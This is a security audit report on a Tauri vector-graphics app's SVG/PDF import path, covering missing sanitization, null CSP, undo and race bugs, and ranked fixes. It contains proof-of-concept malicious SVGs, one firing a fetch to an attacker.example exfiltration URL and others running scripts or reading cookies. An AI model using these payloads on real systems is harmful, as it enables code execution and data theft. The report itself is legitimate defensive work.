# Security Review: vectorfeld

**Date:** 2026-04-19  
**Scope:** SVG/PDF ingestion, state integrity, Tauri CSP, crash-safety  
**Verdict:** NOT safe for untrusted PDFs/SVGs without the fixes in section 7.

---

## 1. Executive Summary

Vectorfeld is a Tauri 2 desktop app with `"csp": null` that ingests SVG files and MuPDF-rendered PDFs
as a first-class workflow. The SVG import pipeline (`parseSvgString` → `document.importNode` → live SVG
DOM) performs **zero sanitization** of the parsed content before inserting it into the live document.
Inline event handlers (`onclick`, `onmouseover`, etc.) on imported elements are live the moment they
land in the DOM; with `csp: null`, any JavaScript they reference executes unrestricted. This makes
opening a crafted SVG from an unknown source equivalent to running untrusted code. The PDF path
through MuPDF reduces the attack surface somewhat (MuPDF outputs structured SVG, not arbitrary
markup), but the clipboard paste path re-exposes the same hole: event handlers on imported elements
survive copy-paste. Secondary issues — no import in-flight guard, zombie-element undo after import,
localStorage without schema validation, and parseFloat NaN propagation — are lower severity but
real. The overall posture is: **unsafe for untrusted PDFs/SVGs today**.

---

## 2. SVG / PDF Ingestion — Sanitization Gaps

### 2a. Inline event handlers survive `document.importNode` — EXPLOITABLE

**File:** `src/model/fileio.ts:290–303`, `src/model/pdfImport.ts:133–155`

`parseSvgString` calls `DOMParser.parseFromString(xmlString, 'image/svg+xml')`, producing an inert
document. It then collects defs children and layer groups **without any attribute or element
filtering**. `applyParsedSvg` calls `document.importNode(layer, true)` and inserts the result into
the live SVG DOM.

Any element with an inline event handler (`onclick`, `onmouseover`, `onfocus`, etc.) becomes a live
trap. When the user clicks or hovers the rendered shape, the handler fires in the Tauri WebView with
no CSP constraint.

**Minimal attack SVG:**
```xml
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 210 297">
  <g data-layer-name="Layer 1">
    <rect width="210" height="297"
          onclick="fetch('https://attacker.example/exfil?d='+btoa(document.title))"
          fill="white"/>
  </g>
</svg>
```

Opening this file and clicking anywhere on the canvas fires the handler. With `csp: null` and
Tauri's `allowlist` unrestricted, this has access to every Tauri API exposed to the front-end.

**Also applies to:** `<use href="javascript:...">`, `xlink:href="javascript:..."`, `<a href="...">`,
and `<set>` / `<animate>` `to` attributes on `onbegin` handlers.

### 2b. `<script>` elements imported into live SVG — LOW-MODERATE

`<script>` nodes brought in via `document.importNode` do **not** auto-execute in modern browsers
(unlike `innerHTML`-parsed scripts). However, `<script>` blocks inside a `<defs>` element are also
imported without filtering (`fileio.ts:234–236`). Behavior in Tauri's WKWebView (macOS) and
WebView2 (Windows) may differ from Chromium; this should be confirmed before distribution, as
some embedded webviews do execute such scripts.

### 2c. `<foreignObject>` carrying arbitrary HTML — EXPLOITABLE (if CSP null)

`<foreignObject>` is not filtered anywhere. An SVG with:

```xml
<foreignObject width="100" height="100">
  <body xmlns="http://www.w3.org/1999/xhtml">
    <script>alert(1)</script>
  </body>
</foreignObject>
```

embeds a full HTML subtree inside the SVG. Inline `<script>` tags in `foreignObject` **do** execute
in most WebView contexts. This is the highest-confidence remote code execution vector.

### 2d. `clipboard.ts` innerHTML preserves imported event handlers — EXPLOITABLE

**File:** `src/model/clipboard.ts:45, 75`

`pasteClipboard` uses:
```ts
temp.innerHTML = html
```
…where `html` is the output of `XMLSerializer.serializeToString(element)` on a previously-selected
element. If the selected element came from an imported SVG, its event handlers are serialized into
the string and re-parsed. Setting `innerHTML` on an SVG `<g>` element preserves inline handlers.
This means: **import → select → copy → paste** keeps malicious handlers alive across sessions (if
the clipboard string is persisted anywhere).

### 2e. Base64 `data:` URIs from PDF — POTENTIAL ANNOYANCE

MuPDF's SVG output uses `<image href="data:image/png;base64,...">` for embedded rasters. The base64
blob is not validated as a well-formed PNG before insertion. A crafted PDF could embed an SVG
data URI (`data:image/svg+xml,...`) that, when rendered, triggers its own inline handlers inside a
nested SVG context. Severity depends on WebView sandboxing of nested SVG; treat as **POTENTIAL
ANNOYANCE → EXPLOITABLE** until confirmed.

### 2f. `drawingTags` allowlist bypassed when layers exist — EXPLOITABLE

**File:** `src/model/fileio.ts:244–261`

The `drawingTags` allowlist (`['g','line','rect','ellipse','circle','path','text','polygon','polyline']`)
is only applied in the **no-layers** fallback path. If the SVG contains any `<g data-layer-name>`
element, the entire layer group — including `<script>`, `<foreignObject>`, `<use>`, `<image>`,
`<a>`, `<set>`, `<animate>` — is imported without any tag filtering.

---

## 3. State / Memory / Listener Leaks

### 3a. Zombie elements after import — DATA CORRUPTION

**File:** `src/model/commands.ts:120–125` (`RemoveElementCommand.undo`)

`RemoveElementCommand` captures `removedParent` at execute-time. When `importSvg`/`importPdf` is
called, all existing layers are deleted from the DOM (`layer.remove()`). An undo of a
pre-import `RemoveElementCommand` will call `removedParent.insertBefore(element, ...)` on the now-
detached layer node. The DOM mutation succeeds (detached nodes accept children) but the element
is invisible — it lives in a garbage subtree. No error, no warning, silent data corruption.

Scenario: Draw rect → undo → import SVG → redo → rect appears. But: Draw rect → import SVG → undo → rect is now in a detached layer.

### 3b. `ReorderElementCommand` captures parent at construction — DATA CORRUPTION

**File:** `src/model/commands.ts:166`

```ts
this.parent = element.parentElement!
```

If the element's parent layer is removed before undo, `undo()` inserts back into a detached node.

### 3c. `subscribeSelection` listeners in module scope — POTENTIAL ANNOYANCE

All subscriber arrays (`selection.ts`, `guides.ts`, `grid.ts`, etc.) are module-level singletons. In
test environments (or if the app ever mounts multiple Canvas instances), listeners accumulate.
In the actual single-Canvas production app this is benign, but `unsubscribeAll` is never called on
navigation / unmount of top-level components like `App`. The `useEffect` cleanup functions in
individual components (`Canvas`, `ControlBar`, `PropertiesPanel`, `SwatchPanel`, `LayersPanel`)
correctly return unsubscribe functions, so the React lifecycle is clean. No active leak in
production; risk is confined to tests and future multi-canvas scenarios.

### 3d. Text tool `setInterval` not cleared on document replace — POTENTIAL ANNOYANCE

**File:** `src/tools/textTool.ts:127`

If the text tool is active during `importSvg`/`importPdf`, the blink interval keeps firing. When
the imported doc replaces layers, the `state.caret` reference may point to a detached SVG element.
The interval keeps setting `style.display` on a detached node — harmless but wasteful. Worse,
if the SVG element reference is the only reference, it leaks until the text tool is deactivated.

---

## 4. Race Conditions

### 4a. Double `importPdf` — DATA CORRUPTION

**File:** `src/App.tsx:151`, `src/model/pdfImport.ts:90–114`

There is no in-flight guard on `importPdf` or `importSvg`. If the user opens the menu and clicks
"Open PDF..." twice before the first file picker resolves, two concurrent import pipelines run. Both
call `applyParsedSvg`, which clears all layers before re-adding. The sequence:

1. Import A starts, clears layers
2. Import B starts, clears layers (A's newly-added layers are now gone)
3. Import A's `syncIdCounter` runs on the SVG that now has B's content

Result: one PDF's content is silently discarded; ID counter is advanced past A's IDs based on B's
DOM state.

### 4b. Import during active undo — DATA CORRUPTION

If a user triggers undo while `renderPageToSvg` (async, awaits MuPDF WASM) is in flight, the
undo removes a layer element. When `applyParsedSvg` then runs, `getLayerElements()` returns a
stale result (or none), and the post-import DOM may contain remnants of the undo state.

### 4c. `getMuPDF()` concurrency — POTENTIAL ANNOYANCE

`getMuPDF()` is a double-checked singleton:
```ts
if (mupdf) return mupdf
mupdf = await import('mupdf')
```
Concurrent first calls both see `mupdf === null` and both trigger the dynamic import. The second
`await import('mupdf')` resolves to the same cached module (Vite/browser module cache deduplicates),
so there is no actual double-load. Low risk but non-obvious.

### 4d. `PropertiesPanel` input commit during import — POTENTIAL ANNOYANCE

`PropertiesPanel` debounces attribute changes on blur/Enter. If the user is editing a property
while an import resolves (e.g., they opened the file picker, tabbed to the panel, edited a value,
then the import resolved), the `ModifyAttributeCommand` may execute on an element that has been
replaced by the import. The element reference in `selection.ts` is stale; `applyAttr` sets an
attribute on a detached node. Silent data loss.

---

## 5. Tauri / CSP

### 5a. `"csp": null` — EXPLOITABLE for distribution

**File:** `src-tauri/tauri.conf.json` (line: `"csp": null`)

The Content Security Policy is disabled. Combined with finding 2a, this means any inline event
handler in an imported SVG can:

- Call any Tauri `invoke()` command registered in the backend (file system, shell, etc.)
- Make network requests via `fetch` to arbitrary hosts
- Read/write `localStorage` to persist payloads
- Execute arbitrary JavaScript with full renderer privileges

A hardened CSP for distribution should be:
```json
"csp": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'none'"
```
Note that `connect-src 'none'` is appropriate for a fully offline tool. Any CSP tighter than
`script-src 'self'` will also break inline event handlers, providing defense-in-depth even if
sanitization is incomplete.

### 5b. No Tauri allowlist review

The Tauri 2 `permissions` configuration was not reviewed in detail. Any over-broad permissions
(e.g., `fs:allow-write-all`, `shell:allow-execute`) compound the risk from 5a and 2a.

---

## 6. Crash-Safety — parseFloat / NaN / null-deref

### 6a. NaN propagation from adversarial `viewBox` — POTENTIAL ANNOYANCE

**File:** `src/model/pdfImport.ts:40–46` (`postProcessPdfSvg`)

The regex replacement calls `parseFloat(x/y/w/h)` on captured groups from the viewBox. A MuPDF-
produced SVG is well-formed, but a hand-crafted SVG with `viewBox="NaN NaN NaN NaN"` passes
`parseFloat` silently and produces `NaN.toFixed(2)` = `"NaN"`. The live SVG then has
`viewBox="NaN NaN NaN NaN"`, which renders as a blank canvas. No crash, but the document is
broken and there is no error surfaced to the user.

### 6b. `parseFloat(...|| '0')` fallback chains — POTENTIAL ANNOYANCE

**File:** `src/tools/selectTool.ts:55–84`, `src/tools/freeTransformTool.ts:269`

All attribute reads use `parseFloat(el.getAttribute(attr) || '0')`. An adversarial element with
`x="NaN"` will produce `NaN` (the `||` fallback only fires for `null`/`""`, not for `"NaN"`).
Subsequent arithmetic with NaN produces NaN, which propagates into `setAttribute` calls,
writing `x="NaN"` back. Repeated edit cycles spread NaN through position attributes. This is
a **data corruption** class bug, not a crash — but produces a visually broken document.

### 6c. `vb.width === 0` guard in `handleDocSize` — ADEQUATELY HANDLED

`src/model/selection.ts:110` correctly returns a fallback `2` when `vb.width === 0`.

### 6d. Zero-bbox division in scale — ADEQUATELY HANDLED

`src/tools/selectTool.ts:557–558` guards with `MIN_BBOX_DIM = 0.001`.

### 6e. `localStorage` JSON parse — ADEQUATELY HANDLED

`src/model/swatches.ts:28–31` wraps `JSON.parse` in try/catch and falls back to defaults. However,
there is no **schema validation** of the parsed object. A corrupt or crafted localStorage entry
that passes JSON parsing but has unexpected types (e.g., `color: 123` instead of `color: "string"`)
will flow through `getSwatches()` into color pickers without type checking. This can cause
`undefined` to be set as a CSS color value, producing rendering noise but no security
consequence beyond annoying visual artifacts. Severity: POTENTIAL ANNOYANCE.

### 6f. `id="vf-<huge-number>"` inflates ID counter — POTENTIAL ANNOYANCE

**File:** `src/model/document.ts:14–27` (`syncIdCounter`)

An imported SVG with `id="vf-2000000000"` sets `nextId` to 2000000001. All subsequent IDs are
skipped past. No integer overflow (JS uses 64-bit floats, safe to 2^53), but this causes
unnecessary skipping and could indicate an intent to exhaust the namespace.

---

## 7. Top 10 Fixes, Ranked

| # | Severity | Fix |
|---|----------|-----|
| 1 | EXPLOITABLE | **Sanitize SVG on import.** Strip all inline event handler attributes (`on*`), `<script>`, `<foreignObject>`, and `javascript:` URIs before calling `document.importNode`. Use a recursive element walk in `parseSvgString`. A 30-line allowlist-based sanitizer eliminates the entire class. |
| 2 | EXPLOITABLE | **Enable CSP in `tauri.conf.json`.** Set `"csp": "default-src 'self'; script-src 'self'; img-src 'self' data: blob:; connect-src 'none'"`. This is defense-in-depth that makes any bypassed event handler a no-op for network exfiltration. Required before any distribution. |
| 3 | EXPLOITABLE | **Sanitize `clipboard.ts` paste path.** Replace `temp.innerHTML = html` with `DOMParser` + the same sanitizer from fix #1, or re-serialize through `createElementNS` + attribute allowlist. |
| 4 | DATA CORRUPTION | **Add import in-flight guard.** Track `isImporting` flag in both `importSvg` and `importPdf`; return early (or disable menu items) while a prior import is in flight. |
| 5 | DATA CORRUPTION | **Guard `RemoveElementCommand.undo` for detached parent.** Before `insertBefore`/`appendChild`, check `this.removedParent.isConnected`. If detached, log a warning and skip or clear the undo entry. Apply same guard to `ReorderElementCommand`. |
| 6 | DATA CORRUPTION | **Clear undo history on import.** `importSvg`/`importPdf` replace the entire document. Any prior undo stack entries reference elements that no longer exist. Call `history.clear()` (add this method to `CommandHistory`) after a successful import. |
| 7 | POTENTIAL ANNOYANCE | **Schema-validate `localStorage` swatches.** After `JSON.parse`, verify the result is an array of `{id: string, name: string, color: string}`. Reject non-conforming shapes and fall back to defaults. |
| 8 | POTENTIAL ANNOYANCE | **Surface import errors to user.** `importPdf` catches and `reject`s, but `App.tsx` does not handle the rejected promise (`.catch` is absent). An unhandled rejection is silently swallowed. Add a `catch` that shows a user-visible error notification. |
| 9 | POTENTIAL ANNOYANCE | **NaN guard in `postProcessPdfSvg`.** After `parseFloat`, check `isNaN` and skip the replacement (leave original viewBox) rather than emitting `"NaN NaN NaN NaN"`. |
| 10 | POTENTIAL ANNOYANCE | **`syncIdCounter` cap.** After scanning imported IDs, if `nextId` would exceed a reasonable bound (e.g., 10 million), log a warning. This catches adversarial ID stuffing. |

---

## Appendix: Minimal Reproduction SVGs

### A1 — Event handler (tests fix #1 and #2)
```xml
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 210 297">
  <g data-layer-name="Layer 1">
    <rect width="210" height="297" fill="white"
          onclick="document.title='PWNED:'+document.cookie"/>
  </g>
</svg>
```
Import, then click the canvas. If `document.title` changes, fix #1 is needed.

### A2 — foreignObject RCE (tests fix #1)
```xml
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <g data-layer-name="Layer 1">
    <foreignObject width="100" height="100">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <script>document.title='foreignObject-pwned'</script>
      </body>
    </foreignObject>
  </g>
</svg>
```

### A3 — Script in defs (tests webview behavior)
```xml
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <defs><script>document.title='defs-pwned'</script></defs>
  <g data-layer-name="Layer 1"><rect width="100" height="100"/></g>
</svg>
```

### A4 — NaN viewBox (tests fix #9)
```xml
<svg xmlns="http://www.w3.org/2000/svg" viewBox="NaN NaN NaN NaN">
  <g data-layer-name="Layer 1"><rect width="10" height="10" x="5" y="5"/></g>
</svg>
```
